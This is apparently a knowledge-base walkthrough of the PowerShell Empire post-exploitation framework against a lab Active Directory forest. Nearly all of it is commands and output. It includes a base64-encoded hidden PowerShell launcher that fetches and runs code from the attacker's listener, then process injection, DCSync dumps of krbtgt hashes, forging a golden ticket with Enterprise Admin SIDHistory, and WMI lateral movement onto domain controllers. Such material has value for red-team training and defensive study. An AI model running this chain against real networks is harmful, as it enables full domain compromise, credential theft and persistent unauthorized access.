Powershell Empire is  

# Installing via GIT

## Clone GIT Repo
```
root@attacker:~# git clone https://github.com/PowerShellEmpire/Empire.git empire
Cloning into 'empire'...
remote: Counting objects: 1011, done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 1011 (delta 0), reused 0 (delta 0), pack-reused 1005
Receiving objects: 100% (1011/1011), 2.02 MiB, done.
Resolving deltas: 100% (545/545), done.
```

## Using the Install script
```
root@attacker:~# cd empire/
root@attacker:~/empire# cd setup/
root@attacker:~/empire/setup# ./install.sh
Reading package lists... Done
Building dependency tree
Reading state information... Done

<SNIP (bunch of python packages getting installed)>

Successfully installed pydispatcher
Cleaning up...

 [>] Enter server negotiation password, enter for random generation:

 [*] Database setup completed!

root@attacker:~/empire/setup#
```

## Generating SSL Certificate

You really only need to do this if you plan on using a self signed SSL certificate for a SSL listener.

```
root@attacker:~/empire/setup# ./cert.sh
Generating a 2048 bit RSA private key
.............+++
..................................+++
writing new private key to '../data/empire.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:


 [*] Certificate written to ../data/empire.pem
```
Thats it, everything should be good to go to use at this point

# Usage

## Startup
```
root@attacker:~/empire/setup# cd ..
root@attacker:~/empire# ./empire
====================================================================================
 Empire: PowerShell post-exploitation agent | [Version]: 1.2.1
====================================================================================
 [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3
====================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       104 modules currently loaded

       0 listeners currently active

       0 agents currently active

(Empire) >
```

## Listeners

```
(Empire) > listeners
[!] No listeners currently active
(Empire: listeners) > info

Listener Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        test                             Listener name.
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  StagingKey        True        MySecretKeyHere                  Staging key for initial agent negotiation.
  Type              True        native                           Listener type (native, pivot, hop, foreign, meter).
  RedirectTarget    False                                        Listener target to redirect to for pivot/hop.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Host              True        http://172.16.102.154:8080       Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultProfile    True        /admin/get.php,/news.asp,/login/ Default communication profile for the agent.
                                process.jsp|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Port              True        8080                             Port for the listener.


(Empire: listeners) > set Name AttackerKBExample
(Empire: listeners) > run
```

## Stagers
```
(Empire: listeners) > usestager
dll           ducky         hop_php       hta           launcher      launcher_bat  launcher_vbs  macro         pth_wmis      stager        war
(Empire: listeners) > usestager launcher
(Empire: stager/launcher) >
(Empire: stager/launcher) > info

Name: Launcher

Description:
  Generates a one-liner stage0 launcher for Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  Base64           True        True              Switch. Base64 encode the output.
  Listener         True                          Listener to generate stager for.
  OutFile          False                         File to output launcher to, otherwise
                                                 displayed on the screen.
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).


(Empire: stager/launcher) > set Listener AttackerKBExample
(Empire: stager/launcher) > generate
powershell.exe -NoP -NonI -W Hidden -Enc JABXAEMAPQBOAEUAdwAtAE8AYgBqAEUAQwBUACAAUwB5AHMAdABFAE0ALgBOAGUAVAAuAFcARQBCAEMATABJAEUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBjAC4ASABFAGEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUAByAE8AWAB5ACAAPQAgAFsAUwB5AFMAdABlAG0ALgBOAGUAdAAuAFcARQBiAFIARQBRAHUAZQBzAHQAXQA6ADoARABFAGYAYQBVAGwAVABXAGUAQgBQAHIATwBYAHkAOwAkAHcAYwAuAFAAUgBvAHgAWQAuAEMAcgBlAEQARQBOAHQASQBhAEwAcwAgAD0AIABbAFMAWQBTAFQAZQBtAC4ATgBlAFQALgBDAHIAZQBEAEUAbgB0AEkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAEUAZgBhAFUAbABUAE4AZQBUAHcAbwByAEsAQwBSAGUAZABFAG4AdABpAEEAbABTADsAJABLAD0AJwB5AG0AVAA8AC8AagByACUAbwBWAFkANwAoAEwAJgB8AEQAWwBrADUAPwB9AEkAegBQACkAcQBiAEgAZwBcAEMAJwA7ACQASQA9ADAAOwBbAGMASABBAFIAWwBdAF0AJABCAD0AKABbAGMAaABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AG4ATABPAEEARABTAHQAcgBJAE4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA1ADQAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgATwBSACQASwBbACQAaQArACsAJQAkAEsALgBMAEUATgBHAFQAaABdAH0AOwBJAEUAWAAgACgAJABiAC0ASgBvAEkATgAnACcAKQA=
```

## First shell
```
(Empire: stager/launcher) > [+] Initial agent VBVAF1FS13DZVGG1 from 172.16.102.12 now active

(Empire: stager/launcher) > agents

[*] Active agents:

  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------          -----------     ------------    ---------           -------             -----    --------------------
  VBVAF1FS13DZVGG1   172.16.102.12   CLIENT2K8       *RESEARCH\justauser powershell/2808     5/0.0    2015-10-10 05:35:46
```

## Interacting with shell and issuing commands
```
(Empire: agents) > interact VBVAF1FS13DZVGG1
(Empire: VBVAF1FS13DZVGG1) > getuid
(Empire: VBVAF1FS13DZVGG1) >
RESEARCH\justauser
```

## Using a module
```
(Empire: VBVAF1FS13DZVGG1) > usemodule credentials/tokens
(Empire: credentials/tokens) > info

           Name: Invoke-TokenManipulation
         Module: credentials/tokens
     NeedsAdmin: True
      OpsecSafe: True
   MinPSVersion: 2
     Background: False
OutputExtension: None

Authors:
  @JosephBialek

Description:
  Runs PowerSploit's Invoke-TokenManipulation to enumerate
  Logon Tokens available and uses them to create new
  processes. Similar to Incognito's functionality. Note: if
  you select ImpersonateUser or CreateProcess, you must
  specify one of Username, ProcessID, Process, or ThreadId.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  ProcessID        False                                 ProcessID to impersonate token of.
  NoUI             False                                 Switch. Use if creating a process which
                                                         doesn't need a UI.
  ShowAll          False                                 Switch. Enumerate all tokens.
  Agent            True        VBVAF1FS13DZVGG1          Agent to run module on.
  ProcessArgs      False                                 Arguments for a spawned process.
  WhoAmI           False                                 Switch. Displays current credentials.
  Username         False                                 Username to impersonate token of.
  RevToSelf        False                                 Switch. Revert to original token.
  Process          False                                 Process name to impersonate token of.
  CreateProcess    False                                 Specify a process to create instead of
                                                         impersonating the user.
  ImpersonateUser  False                                 Switch. Will impersonate an alternate
                                                         users logon token in the PowerShell
                                                         thread.
  ThreadId         False                                 Thread to impersonate token of.

(Empire: credentials/tokens) > run

Domain       Username        ProcessId IsElevated TokenType
------       --------        --------- ---------- ---------
RESEARCH     Administrator        2584       True Primary
NT AUTHORITY SYSTEM                492       True Primary
RESEARCH     justauser            1768       True Primary
NT AUTHORITY NETWORK SERVICE      1936       True Primary
```

## Injecting Powershell into another process
```
(Empire: credentials/tokens) > usemodule management/psinject
(Empire: management/psinject) > info

           Name: Invoke-PSInject
         Module: management/psinject
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @harmj0y
  @sixdub
  leechristensen (@tifkin_)

Description:
  Utilizes Powershell to to inject a Stephen Fewer formed
  ReflectivePick which executes PS codefrom memory in a remote
  process

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  ProcId           True                                  ProcessID to inject into.
  ProxyCreds       False       default                   Proxy credentials
                                                         ([domain\]username:password) to use for
                                                         request (default, none, or other).
  Agent            True        VBVAF1FS13DZVGG1          Agent to run module on.
  Listener         True                                  Listener to use.
  Proxy            False       default                   Proxy to use for request (default, none,
                                                         or other).
  UserAgent        False       default                   User-agent string to use for the staging
                                                         request (default, none, or other).

(Empire: management/psinject) > set ProcId 2584
(Empire: management/psinject) > set Listener AttackerKBExample
(Empire: management/psinject) > run
(Empire: management/psinject) >
Job started: Debug32_2ywkz
[+] Initial agent HX2Y4KAS34TVVHKN from 172.16.102.12 now active


(Empire: management/psinject) > agents

[*] Active agents:

  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------          -----------     ------------    ---------           -------             -----    --------------------
  VBVAF1FS13DZVGG1   172.16.102.12   CLIENT2K8       *RESEARCH\justauser powershell/2808     5/0.0    2015-10-10 05:49:00
  HX2Y4KAS34TVVHKN   172.16.102.12   CLIENT2K8       *RESEARCH\Administracmd/2584            5/0.0    2015-10-10 05:48:57
```

## Mapping Domain Trusts
```
(Empire: agents) > interact HX2Y4KAS34TVVHKN
(Empire: HX2Y4KAS34TVVHKN) > usemodule situational_awareness/network/mapdomaintrusts
(Empire: situational_awareness/network/mapdomaintrusts) > info

           Name: Invoke-MapDomainTrusts
         Module: situational_awareness/network/mapdomaintrusts
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @harmj0y

Description:
  Maps all reachable domain trusts with .CSV output. Part of
  PowerView.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Agent            True        HX2Y4KAS34TVVHKN          Agent to run module on.
  LDAP             False                                 Switch. Use LDAP for domain queries
                                                         (less accurate).

(Empire: situational_awareness/network/mapdomaintrusts) > run
(Empire: situational_awareness/network/mapdomaintrusts) >
Job started: Debug32_7j2pj


"SourceDomain","TargetDomain","TrustType","TrustDirection"
"research.sittingduck.info","sittingduck.info","ParentChild","Bidirectional"
"sittingduck.info","research.sittingduck.info","ParentChild","Bidirectional"


Invoke-MapDomainTrusts completed
```

## DCSync
```
(Empire: situational_awareness/network/mapdomaintrusts) > usemodule credentials/mimikatz/dcsync


(Empire: credentials/mimikatz/dcsync) > info

           Name: Invoke-Mimikatz DCsync
         Module: credentials/mimikatz/dcsync
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @gentilkiwi
  @JosephBialek

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract a
  given account password through Mimikatz's lsadump::dcsync
  module. This doesn't need code execution on a given DC, but
  needs to be run from a user context with DA equivalent
  privileges.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  domain           False                                 Specified (fqdn) domain to pull for the
                                                         primary domain/DC.
  user             True                                  Username to extract the hash for
                                                         (domain\username format).
  Agent            True        HX2Y4KAS34TVVHKN          Agent to run module on.
  dc               False                                 Specified (fqdn) domain controller to
                                                         pull replication data from.

(Empire: credentials/mimikatz/dcsync) > set user RESEARCH\krbtgt
(Empire: credentials/mimikatz/dcsync) > run



Job started: Debug32_hmch1

Hostname: CLIENT2K8.research.sittingduck.info / S-1-5-21-1931688288-432673180-3111857317
  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 23 2015 23:05:23)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 16 modules * * */


mimikatz(powershell) # lsadump::dcsync /user:RESEARCH\krbtgt
[DC] 'research.sittingduck.info' will be the domain
[DC] 'RDC1.research.sittingduck.info' will be the DC server

[DC] 'RESEARCH\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/9/2015 5:43:33 PM
Object Security ID   : S-1-5-21-1931688288-432673180-3111857317-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 859d7b2ffdf34f7f56fffd547925c0af
    ntlm- 0: 859d7b2ffdf34f7f56fffd547925c0af
    lm  - 0: 996738f7e7cdd11a68d2b4a2fe4e6bf4

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : RESEARCH.SITTINGDUCK.INFOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 09411aeb7d8b39559ba4521c522e509ce16bdddfa001024f8d1da0c843ed0522
      aes128_hmac       (4096) : 04c9e44b61bcaf87495fe29bf2aa345f
      des_cbc_md5       (4096) : d56149929bc13261

* Primary:Kerberos *
    Default Salt : RESEARCH.SITTINGDUCK.INFOkrbtgt
    Credentials
      des_cbc_md5       : d56149929bc13261

* Packages *
    Kerberos-Newer-Keys

* Primary:WDigest *
    01  756a3c6c76e9ba6acd9208b1a5ff80ce
    02  a528871c70120bb10f27b5877b6c1be4
    03  f9d38cc0aa612e7d6a008bdc89b09daa
    04  756a3c6c76e9ba6acd9208b1a5ff80ce
    05  a528871c70120bb10f27b5877b6c1be4
    06  b3af56940244a4256db94cf57b32767d
    07  756a3c6c76e9ba6acd9208b1a5ff80ce
    08  27ad21674ab73bc8126a29aeb41a74b6
    09  27ad21674ab73bc8126a29aeb41a74b6
    10  9e454eadbd580bfeb7c41fdb1bff0e1f
    11  cd589cdf4116662da0f16ead11e290b6
    12  27ad21674ab73bc8126a29aeb41a74b6
    13  6d8ceea0939080b76a8ae7fae554e9af
    14  cd589cdf4116662da0f16ead11e290b6
    15  efb50d51a296e70fcea2b3f1efe4ac2b
    16  efb50d51a296e70fcea2b3f1efe4ac2b
    17  c7521ac39670987d9ebed743f93bf7f3
    18  3c9aa63050ca91a30e5f68cd6620b4f0
    19  5da798120a891a96c3710abad24002b9
    20  5861af374439b4696e4d8bb06dbcd809
    21  319a6483e069066801d8db3c1f31c26a
    22  319a6483e069066801d8db3c1f31c26a
    23  5954c4ddcb87981ed4c49c3e20b85aa4
    24  a964c8de05b627b0fd428c31f97dde74
    25  a964c8de05b627b0fd428c31f97dde74
    26  1d4619443926b677ebf4b101dae82464
    27  61a262a0d587052b6cd09e06bb3bcb90
    28  6655ab4cbadfb45b814759e307c2a0bc
    29  f21137140f07639a56233baba238c3f8


(Empire: credentials/mimikatz/dcsync) > creds

Credentials:

  CredID  CredType   Domain                   UserName         Host             Password
  ------  --------   ------                   --------         ----             --------
  1       hash       research.sittingduck.infokrbtgt           RDC1             859d7b2ffdf34f7f56fffd547925c0af
```

## Finding parent domain's SID
```
(Empire: credentials/mimikatz/dcsync) > usemodule management/user_to_sid
(Empire: management/user_to_sid) > info

           Name: User-to-SID
         Module: management/user_to_sid
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: False
OutputExtension: None

Authors:
  @harmj0y

Description:
  Converts a specified domain\user to a domain sid.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Domain           True                                  Domain name for translation.
  User             True                                  Username for translation.
  Agent            True        HX2Y4KAS34TVVHKN          Agent to run module on.

(Empire: management/user_to_sid) > set Domain sittingduck.info
(Empire: management/user_to_sid) > set User krbtgt
(Empire: management/user_to_sid) > run
S-1-5-21-2988714168-2756154285-2485713731-502
```

## Generating Golden Ticket with parent domain SIDHistory for Enterprise Admins
```
(Empire: management/user_to_sid) > usemodule credentials/mimikatz/golden_ticket
(Empire: credentials/mimikatz/golden_ticket) > info

           Name: Invoke-Mimikatz Golden Ticket
         Module: credentials/mimikatz/golden_ticket
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to generate a
  golden ticket and inject it into memory.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  CredID           False                                 CredID from the store to use for ticket
                                                         creation.
  domain           False                                 The fully qualified domain name.
  user             True                                  Username to impersonate.
  groups           False                                 Optional comma separated group IDs for
                                                         the ticket.
  sid              False                                 The SID of the specified domain.
  krbtgt           False                                 krbtgt NTLM hash for the specified
                                                         domain
  sids             False                                 External SIDs to add as sidhistory to
                                                         the ticket.
  id               False                                 id to impersonate, defaults to 500.
  Agent            True        HX2Y4KAS34TVVHKN          Agent to run module on.
  endin            False                                 Lifetime of the ticket (in minutes).
                                                         Default to 10 years.



(Empire: credentials/mimikatz/golden_ticket) > set CredID 1
(Empire: credentials/mimikatz/golden_ticket) > set sids S-1-5-21-2988714168-2756154285-2485713731-519
(Empire: credentials/mimikatz/golden_ticket) > set user Administrator
(Empire: credentials/mimikatz/golden_ticket) > run
(Empire: credentials/mimikatz/golden_ticket) >
Job started: Debug32_40sz1

Hostname: CLIENT2K8.research.sittingduck.info / S-1-5-21-1931688288-432673180-3111857317
  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 23 2015 23:05:23)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 16 modules * * */


mimikatz(powershell) # kerberos::golden /domain:research.sittingduck.info /user:Administrator /sid:S-1-5-21-1931688288-432673180-3111857317 /krbtgt:859d7b2ffdf34f7f56fffd547925c0af /sids:S-1-5-21-2988714168-2756154285-2485713731-519 /ptt
User      : Administrator
Domain    : research.sittingduck.info
SID       : S-1-5-21-1931688288-432673180-3111857317
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2988714168-2756154285-2485713731-519 ;
ServiceKey: 859d7b2ffdf34f7f56fffd547925c0af - rc4_hmac_nt
Lifetime  : 10/10/2015 5:55:42 AM ; 10/7/2025 5:55:42 AM ; 10/7/2025 5:55:42 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ research.sittingduck.info' successfully submitted for current session

(Empire: credentials/mimikatz/golden_ticket) >
```

## DCSync with Golden Ticket against parent domain
```
(Empire: HX2Y4KAS34TVVHKN) > usemodule credentials/mimikatz/dcsync
(Empire: credentials/mimikatz/dcsync) > info

           Name: Invoke-Mimikatz DCsync
         Module: credentials/mimikatz/dcsync
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @gentilkiwi
  @JosephBialek

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract a
  given account password through Mimikatz's lsadump::dcsync
  module. This doesn't need code execution on a given DC, but
  needs to be run from a user context with DA equivalent
  privileges.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  domain           False                                 Specified (fqdn) domain to pull for the
                                                         primary domain/DC.
  user             True        RESEARCH\krbtgt           Username to extract the hash for
                                                         (domain\username format).
  Agent            True        HX2Y4KAS34TVVHKN          Agent to run module on.
  dc               False                                 Specified (fqdn) domain controller to
                                                         pull replication data from.

(Empire: credentials/mimikatz/dcsync) > set user SITTINGDUCK\krbtgt
(Empire: credentials/mimikatz/dcsync) > set domain sittingduck.info
(Empire: credentials/mimikatz/dcsync) > run
(Empire: credentials/mimikatz/dcsync) >
Job started: Debug32_e6cz9

Hostname: CLIENT2K8.research.sittingduck.info / S-1-5-21-1931688288-432673180-3111857317
  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 23 2015 23:05:23)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 16 modules * * */


mimikatz(powershell) # lsadump::dcsync /user:SITTINGDUCK\krbtgt /domain:sittingduck.info
[DC] 'sittingduck.info' will be the domain
[DC] 'DC2.sittingduck.info' will be the DC server

[DC] 'SITTINGDUCK\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/9/2015 3:49:10 PM
Object Security ID   : S-1-5-21-2988714168-2756154285-2485713731-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 26db375e3e5fde959313241890b3a1ea
    ntlm- 0: 26db375e3e5fde959313241890b3a1ea
    lm  - 0: 05a1c1d6a05b53f837786a728fa9d8bb

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : SITTINGDUCK.INFOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fe5a81ff76409c984ca2d0a46affdd87cc103877ee498b2b639f19eecff9e238
      aes128_hmac       (4096) : d470bd3bdb25667663779523cae3a4ea
      des_cbc_md5       (4096) : 10bf61e6025efdb5

* Primary:Kerberos *
    Default Salt : SITTINGDUCK.INFOkrbtgt
    Credentials
      des_cbc_md5       : 10bf61e6025efdb5

* Packages *
    Kerberos-Newer-Keys

* Primary:WDigest *
    01  e9ab3d1449afc1cfd8275ae019809f01
    02  94797592fb2263a3408996313e10feec
    03  df54a71fe7c6a0a23ec84a49ede10ff1
    04  e9ab3d1449afc1cfd8275ae019809f01
    05  94797592fb2263a3408996313e10feec
    06  3c43dfcdec94b738971417875b18b26a
    07  e9ab3d1449afc1cfd8275ae019809f01
    08  ff2c419c507876e296252ce0d5bd18bf
    09  ff2c419c507876e296252ce0d5bd18bf
    10  27b2c212c995140484321a39cd188ec8
    11  786563d6e9b4f7bdf127b866734802ae
    12  ff2c419c507876e296252ce0d5bd18bf
    13  64b6a311317dca09646ba391a12fd372
    14  786563d6e9b4f7bdf127b866734802ae
    15  febdf2223051f7bfb524ccb0325e7c66
    16  febdf2223051f7bfb524ccb0325e7c66
    17  0cf66fd198a946f46e14b833f45dc8bb
    18  d83fc5e642dc5e703e35de7772ab25bd
    19  04e48653fecf74355524d93177571239
    20  468436d1b868b2bc918c97b4020d26b0
    21  66323feaf64a290c56020f26396a16c8
    22  66323feaf64a290c56020f26396a16c8
    23  00699f1bc514e661fbd1e29101fe24de
    24  4add75a98618c36fed652c0aa059f3ab
    25  4add75a98618c36fed652c0aa059f3ab
    26  935c908fccd9d8d766e4cd5a2de5eab5
    27  5adc9c0f998ba568f11fce07d0f3b34f
    28  73ce101707505940042f6a6ec3670c37
    29  5a14a12a0afaab5341344058ed71028d


```

## Using WMI for lateral movement into DCs and parent DCs
```
(Empire: lateral_movement/invoke_wmi) > info

           Name: Invoke-WMI
         Module: lateral_movement/invoke_wmi
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: False
OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using WMI.

Options:

  Name             Required    Value                     Description
  ----             --------    -------                   -----------
  Listener         True                                  Listener to use.
  CredID           False                                 CredID from the store to use.
  ComputerName     True                                  Host[s] to execute the stager on, comma
                                                         separated.
  Proxy            False       default                   Proxy to use for request (default, none,
                                                         or other).
  UserName         False                                 [domain\]username to use to execute
                                                         command.
  ProxyCreds       False       default                   Proxy credentials
                                                         ([domain\]username:password) to use for
                                                         request (default, none, or other).
  UserAgent        False       default                   User-agent string to use for the staging
                                                         request (default, none, or other).
  Password         False                                 Password to use to execute command.
  Agent            True        HX2Y4KAS34TVVHKN          Agent to run module on.

(Empire: lateral_movement/invoke_wmi) > set Listener AttackerKBExample
(Empire: lateral_movement/invoke_wmi) > set ComputerName RDC1
(Empire: lateral_movement/invoke_wmi) > run
(Empire: lateral_movement/invoke_wmi) > [+] Initial agent VRY24YVDEGDUNN3V from 172.16.102.11 now active

(Empire: lateral_movement/invoke_wmi) > set ComputerName RDC2BEAN
(Empire: lateral_movement/invoke_wmi) > run
(Empire: lateral_movement/invoke_wmi) > set ComputerName dc1.sittingduck.info
[+] Initial agent N2T2ED3RFHDLRWFR from 172.16.102.15 now active
```